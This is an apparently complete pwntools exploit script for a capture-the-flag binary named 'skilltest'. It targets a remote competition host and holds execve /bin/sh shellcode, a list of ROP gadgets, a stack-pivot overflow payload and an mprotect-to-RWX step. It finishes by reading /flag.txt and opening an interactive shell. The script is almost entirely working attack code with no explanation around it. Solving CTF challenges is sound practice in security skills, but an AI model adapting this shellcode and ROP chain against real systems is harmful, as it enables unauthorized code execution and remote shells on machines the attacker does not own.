#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+2900+0', '-e']
context.log_level = 'info'

exe = ELF("./skilltest_patched")
libc = ELF("./libc-2.34.so")

host, port = "skilltest.nc.jctf.pro", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# execve shellcode
shellc = asm('''
	xor esi, esi
	push rsi
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	imul esi
	mov al, 0x3b
	syscall
  ''')

pivot = 0x0000000000401348 # leave ; ret
pop_rbp = 0x00000000004012bd # pop rbp ; ret
pop_rdi_leave = 0x00000000004018dc # pop rdi ; nop ; leave ; ret
add_gadget = 0x00000000004012bc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
set_edx = 0x0000000000401802 # mov edx, dword ptr [rbp - 0x10] ; cmp rax, rdx ; ja 0x401798 ; nop ; nop ; leave ; ret
set_rax = 0x00000000004013e9 # mov rax, qword ptr [rbp - 0x18] ; leave ; ret
add_esi = 0x00000000004013e5 # add esi, eax ; add byte ptr [rax], al ; mov rax, qword ptr [rbp - 0x18] ; leave ; ret

payload = 'A'*0x28 + p64(0x03fe000)+p64(0)*2+p64(0x03fe000)+p64(pivot)
p.sendafter('Nick: ', payload)

# change 0x03fe000 zone mprotect to rwx, then jump to our shellcode
payload2 = p64(0x03fe028)+p64(set_rax)+p64(0x03fe000)+p64(0)*2+p64(0x03fe030)+p64(0x40133a)+p64(0x03fe040)+shellc

p.sendafter('Clan tag: ', payload2)

p.sendline('cat /flag.txt')

p.interactive()

